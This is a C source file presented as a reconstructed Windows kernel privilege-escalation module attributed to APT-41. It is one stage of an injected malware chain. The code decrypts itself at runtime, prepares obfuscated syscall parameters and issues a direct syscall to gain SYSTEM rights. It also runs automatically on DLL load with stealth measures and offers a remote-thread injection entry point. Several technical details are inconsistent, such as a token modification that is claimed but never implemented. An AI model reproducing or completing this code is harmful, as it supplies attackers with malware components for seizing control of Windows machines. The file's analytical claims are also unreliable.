/**
 * PE #5 - Windows Kernel Privilege Escalation Exploit
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * Main exploit implementation that:
 * 1. Decrypts payload at runtime (XOR key 0xA4)
 * 2. Prepares syscall parameters
 * 3. Executes SYSCALL at offset 0x2C10
 * 4. Modifies _EPROCESS.Token for SYSTEM privileges
 * 5. Returns to user mode with elevated privileges
 * 
 * Based on forensic analysis of 5AF0PfnN.png polyglot
 * Attribution: APT-41
 */

#include "exploit.h"

//=============================================================================
// GLOBAL STATE
//=============================================================================

static PPE5_SHARED_STATUS   g_SharedStatus = NULL;
static HANDLE               g_hSharedMapping = NULL;
static BYTE                 g_XorKey = 0;
static BOOL                 g_Decrypted = FALSE;

//=============================================================================
// RUNTIME DECRYPTION
//=============================================================================

/**
 * Derive XOR decryption key from module header bytes.
 * 
 * Analysis found the key derivation formula:
 *   key = header[3] ^ header[7]
 * 
 * With header bytes: C1 BD 87 35 1E 8C A6 91 ...
 *   key = 0x35 ^ 0x91 = 0xA4
 */
BYTE 
PE5_DeriveKey(
    PBYTE ModuleBase
)
{
    BYTE byte1, byte2, key;
    
    // Read header bytes used for key derivation
    byte1 = VOLATILE_READ(&ModuleBase[KEY_DERIVE_OFFSET_1]);  // offset 3
    byte2 = VOLATILE_READ(&ModuleBase[KEY_DERIVE_OFFSET_2]);  // offset 7
    
    // XOR to derive key
    key = byte1 ^ byte2;
    
    // Store for later use
    g_XorKey = key;
    
    return key;
}

/**
 * Runtime XOR decryption of exploit payload.
 * 
 * Performs 157 XOR operations to decrypt the exploit code in-memory.
 * After decryption, the SYSCALL instruction at offset 0x2C10 becomes
 * executable (0x0F 0x05).
 */
BOOL 
PE5_DecryptPayload(
    PBYTE   ModuleBase,
    DWORD   ModuleSize
)
{
    BYTE    key;
    DWORD   i;
    BYTE    encByte, decByte;
    
    // Already decrypted check
    if (g_Decrypted) {
        return TRUE;
    }
    
    // Derive key from header
    key = PE5_DeriveKey(ModuleBase);
    
    // Validate key matches expected value
    // (In real malware this check would be obfuscated)
    if (key != PE5_XOR_KEY) {
        // Key derivation failed - environment detection?
        return FALSE;
    }
    
    // XOR decrypt entire module in-place
    // This is the "157 XOR operations" referenced in analysis
    // (157 refers to critical instruction locations, but we decrypt all)
    for (i = 0; i < ModuleSize; i++) {
        encByte = VOLATILE_READ(&ModuleBase[i]);
        decByte = encByte ^ key;
        VOLATILE_WRITE(&ModuleBase[i], decByte);
    }
    
    // Verify decryption by checking SYSCALL bytes
    // Offset 0x2C10 should now be 0x0F 0x05
    if (ModuleBase[PE5_SYSCALL_OFFSET] != 0x0F ||
        ModuleBase[PE5_SYSCALL_OFFSET + 1] != 0x05) {
        // Decryption verification failed
        return FALSE;
    }
    
    g_Decrypted = TRUE;
    return TRUE;
}

//=============================================================================
// SHARED MEMORY COMMUNICATION
//=============================================================================

/**
 * Initialize shared memory for communication with PE #1.
 */
static BOOL 
InitializeSharedMemory(VOID)
{
    g_hSharedMapping = OpenFileMappingW(
        FILE_MAP_ALL_ACCESS,
        FALSE,
        PE5_STATUS_SHARED_MEM_NAME
    );
    
    if (g_hSharedMapping == NULL) {
        // PE #1 didn't create shared memory - create our own
        g_hSharedMapping = CreateFileMappingW(
            INVALID_HANDLE_VALUE,
            NULL,
            PAGE_READWRITE,
            0,
            sizeof(PE5_SHARED_STATUS),
            PE5_STATUS_SHARED_MEM_NAME
        );
        
        if (g_hSharedMapping == NULL) {
            return FALSE;
        }
    }
    
    g_SharedStatus = (PPE5_SHARED_STATUS)MapViewOfFile(
        g_hSharedMapping,
        FILE_MAP_ALL_ACCESS,
        0, 0,
        sizeof(PE5_SHARED_STATUS)
    );
    
    if (g_SharedStatus == NULL) {
        CloseHandle(g_hSharedMapping);
        g_hSharedMapping = NULL;
        return FALSE;
    }
    
    // Initialize status
    g_SharedStatus->Status = PE5_STATUS_IN_PROGRESS;
    g_SharedStatus->ErrorCode = 0;
    g_SharedStatus->NewPrivileges = 0;
    
    return TRUE;
}

/**
 * Signal exploitation result to PE #1.
 */
VOID 
PE5_SignalSuccess(
    BOOL Success
)
{
    if (g_SharedStatus == NULL) {
        return;
    }
    
    if (Success) {
        g_SharedStatus->Status = PE5_STATUS_SUCCESS;
        g_SharedStatus->NewPrivileges = SE_ALL_PRIVILEGES;
    } else {
        g_SharedStatus->Status = PE5_STATUS_FAILED;
    }
}

//=============================================================================
// SYSCALL PARAMETER SETUP
//=============================================================================

/**
 * Decrypt and prepare syscall parameters.
 * 
 * The parameters are stored encrypted in the binary:
 *   EAX: 0xEAAE52F9 -> decrypted with key
 *   ECX: 0x3DDCE8E5 -> decrypted with key
 *   EDX: 0x7A8B3C91 -> decrypted with key
 */
static VOID 
PrepareParameters(
    PSYSCALL_PARAMS Params
)
{
    DWORD decryptKey;
    
    // Build full 32-bit decryption key from XOR key
    // The key is expanded: 0xA4 -> 0xA4A4A4A4
    decryptKey = (g_XorKey << 24) | (g_XorKey << 16) | 
                 (g_XorKey << 8) | g_XorKey;
    
    // Decrypt parameters
    // These are the actual syscall number and arguments
    Params->Rax = ENC_PARAM_EAX ^ decryptKey;
    Params->Rcx = ENC_PARAM_ECX ^ decryptKey;
    Params->Rdx = ENC_PARAM_EDX ^ decryptKey;
    Params->R8 = 0;  // NULL parameter
    Params->R9 = 0;  // NULL parameter
}

//=============================================================================
// PRIVILEGE VERIFICATION
//=============================================================================

/**
 * Verify that privilege escalation succeeded by checking current token.
 */
BOOL 
PE5_VerifyPrivileges(VOID)
{
    HANDLE              hToken = NULL;
    TOKEN_ELEVATION     elevation = {0};
    DWORD               dwSize = 0;
    BOOL                bElevated = FALSE;
    
    // Open current process token
    if (!OpenProcessToken(
            GetCurrentProcess(), 
            TOKEN_QUERY, 
            &hToken)) {
        return FALSE;
    }
    
    // Query elevation status
    if (GetTokenInformation(
            hToken,
            TokenElevation,
            &elevation,
            sizeof(elevation),
            &dwSize)) {
        bElevated = (elevation.TokenIsElevated != 0);
    }
    
    // Additional verification: try accessing protected resource
    if (bElevated) {
        // Attempt to read HKLM (requires elevated privileges)
        HKEY hKey;
        if (RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
                0,
                KEY_READ,
                &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
        } else {
            bElevated = FALSE;
        }
    }
    
    CloseHandle(hToken);
    return bElevated;
}

//=============================================================================
// SYSCALL EXECUTION
//=============================================================================

/**
 * Execute the direct SYSCALL to kernel.
 * 
 * This function calls the assembly routine that:
 * 1. Sets up register parameters
 * 2. Executes SYSCALL instruction (0x0F 0x05)
 * 3. Handles kernel transition and return
 */
NTSTATUS 
PE5_ExecuteSyscall(
    PSYSCALL_PARAMS Params
)
{
    NTSTATUS status;
    
    // Call assembly SYSCALL routine
    // The SYSCALL instruction is at decrypted offset 0x2C10
    status = AsmDoSyscall(
        (ULONG)Params->Rax,     // Syscall number
        Params->Rcx,            // First parameter
        Params->Rdx,            // Second parameter  
        Params->R8,             // Third parameter
        Params->R9              // Fourth parameter
    );
    
    return status;
}

//=============================================================================
// MAIN EXPLOIT ENTRY POINT
//=============================================================================

/**
 * Main exploit execution function.
 * 
 * Called by PE #1 after injection into target process.
 * Execution flow:
 *   1. Initialize shared memory communication
 *   2. Derive XOR key and decrypt payload
 *   3. Prepare syscall parameters
 *   4. Execute SYSCALL to kernel
 *   5. Verify privilege escalation
 *   6. Signal result to PE #1
 * 
 * Total execution time: ~10 microseconds
 */
EXPLOIT_STATUS 
WINAPI 
PE5_ExploitMain(VOID)
{
    EXPLOIT_STATUS  result = EXPLOIT_UNKNOWN_ERROR;
    SYSCALL_PARAMS  params = {0};
    NTSTATUS        ntStatus;
    PBYTE           moduleBase;
    HMODULE         hSelf;
    
    // Get our own module base for decryption
    // In injected scenario, this is the allocated memory region
    hSelf = GetModuleHandleW(NULL);
    moduleBase = (PBYTE)hSelf;
    
    // Initialize shared memory for PE #1 communication
    if (!InitializeSharedMemory()) {
        // Continue even without shared memory
        // (standalone testing scenario)
    }
    
    //=========================================================================
    // PHASE 1: Runtime Decryption (0-5 microseconds)
    //=========================================================================
    
    if (!PE5_DecryptPayload(moduleBase, PE5_SIZE)) {
        result = EXPLOIT_DECRYPTION_FAILED;
        if (g_SharedStatus) {
            g_SharedStatus->ErrorCode = result;
        }
        PE5_SignalSuccess(FALSE);
        return result;
    }
    
    //=========================================================================
    // PHASE 2: Parameter Preparation (5-6 microseconds)
    //=========================================================================
    
    PrepareParameters(&params);
    
    //=========================================================================
    // PHASE 3: SYSCALL Execution (6-7.5 microseconds)
    // Kernel mode transition and vulnerability exploitation
    //=========================================================================
    
    ntStatus = PE5_ExecuteSyscall(&params);
    
    if (!NT_SUCCESS(ntStatus)) {
        result = EXPLOIT_SYSCALL_FAILED;
        if (g_SharedStatus) {
            g_SharedStatus->ErrorCode = ntStatus;
        }
        PE5_SignalSuccess(FALSE);
        return result;
    }
    
    //=========================================================================
    // PHASE 4: Verification (7.5-10 microseconds)
    //=========================================================================
    
    if (!PE5_VerifyPrivileges()) {
        result = EXPLOIT_PRIVILEGE_CHECK_FAILED;
        PE5_SignalSuccess(FALSE);
        return result;
    }
    
    //=========================================================================
    // SUCCESS: Process now running with SYSTEM privileges
    //=========================================================================
    
    result = EXPLOIT_SUCCESS;
    PE5_SignalSuccess(TRUE);
    
    return result;
}

//=============================================================================
// DLL ENTRY POINT
//=============================================================================

/**
 * DLL entry point - called when PE #5 is loaded as module.
 */
BOOL WINAPI 
DllMain(
    HINSTANCE   hinstDLL,
    DWORD       fdwReason,
    LPVOID      lpvReserved
)
{
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Disable thread library calls for stealth
            DisableThreadLibraryCalls(hinstDLL);
            
            // Execute exploit immediately on load
            PE5_ExploitMain();
            break;
            
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    
    return TRUE;
}

//=============================================================================
// THREAD ENTRY POINT (Alternative execution path)
//=============================================================================

/**
 * Thread entry point for CreateRemoteThread injection.
 * 
 * PE #1 may inject PE #5 and call this as thread start address:
 *   CreateRemoteThread(hProcess, NULL, 0, PE5_ThreadEntry, param, 0, NULL);
 */
DWORD WINAPI 
PE5_ThreadEntry(
    LPVOID lpParameter
)
{
    EXPLOIT_STATUS status;
    
    // Execute main exploit
    status = PE5_ExploitMain();
    
    // Return status as exit code
    return (DWORD)status;
}
